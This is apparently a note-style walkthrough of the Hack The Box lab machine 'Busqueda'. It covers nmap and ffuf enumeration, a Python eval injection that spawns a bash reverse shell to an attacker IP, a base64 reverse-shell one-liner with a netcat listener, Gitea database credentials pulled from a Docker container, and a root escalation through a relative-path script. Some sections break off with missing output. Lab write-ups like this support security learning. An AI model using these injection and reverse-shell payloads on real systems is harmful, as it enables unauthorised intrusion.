This note-style walk-through will be conducted with no Guided mode, as that is currently not available for this box.

Let's start with enumeration. 
```bash
nmap -sCV -oN busqueda 10.129.228.217
```
```bash
tarting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 15:17 EDT

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.01 seconds

```

As the Nmap scan shows, the website on port 80 is redirecting to http://searcher.htb. Let's add this to the hosts file.

```bash
vi /etc/hosts
```

Now, let's take a look at what is on port 80. 

*Another good idea would be, after adding the domain name to the hosts file, to rerun Nmap, because of DNS, there are additional scripts that Nmap runs in that case. For example, discovering additional directories, like .git.

There is also a software version at the bottom of the web application. This could lead to compromise; however, there is an alternative path by doing fuzzing.

Let's create a web request with the application and catch it in Burp Proxy. Copy the request to a file and use it for fuzzing.

![image](/images/2025-07-26-Busqueda/Pasted-image-20250722154033.png)

Copy this to a file. I saved it as web.req.

```bash
ffuf -request web.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
```

*Use -request-proto http, because the web application only accepts HTTP

We find that in some cases, it returns zero when the character is appended to the end of the username. 

Here =>

By playing around with the request, we find an injection point for code execution:

There we go, this looks promising:

Let's create a reverse shell.

```bash
echo -n "bash -c 'bash -i  >& /dev/tcp/10.10.14.195/4444  0>&1'  "|base64
```

```bash
nc -nvlp 4444
```

As this is a totally doable way of landing on the box, I had to use a simpler approach.

![image](/images/2025-07-26-Busqueda/Pasted-image-20250722164224.png)

```bash
'+%2b+__import__('os').popen('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.43/9000+0>%261"').read()+%2b+' 
```

And with that, I got the user flag.

![image](/images/2025-07-26-Busqueda/Pasted-image-20250722164536.png)

By looking around, we found a Gitea instance.

![image](/images/2025-07-26-Busqueda/Pasted-image-20250722164911.png)

In the .git directory, I also found credentials, which are going to help with the login on the newly found web instance.

![image](/images/2025-07-26-Busqueda/Pasted-image-20250726042905.png)

Taking a look at the website, there is nothing that could be used to progress further with this user.
![image](/images/2025-07-26-Busqueda/Pasted-image-20250726043207.png)

However, by using the newly found password and running the sudo -l command, we find a Python script that can be run with sudo privileges.

![image](/images/2025-07-26-Busqueda/Pasted-image-20250726043313.png)

By playing around with the script, I was able to extract credentials from a running Docker instance.

![image](/images/2025-07-26-Busqueda/Pasted-image-20250726043901.png)

Making the output prettier, we can have a better look at the newly found credentials.

```bash
echo -n '{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}' | jq .

Alright, these credentials are going to be for the administrator user on the Gitea application. The account is going to list the script that we used to get the credentials from the Docker instance. By looking at the source code, we find a vulnerability in the code. This vulnerability executes a bash script that does not call the full path, meaning we can use this to our advantage.

In a directory that I can write to, I created this file to get a reverse shell.

![image](/images/2025-07-26-Busqueda/Pasted-image-20250726045259.png)

And we get a shell as root:
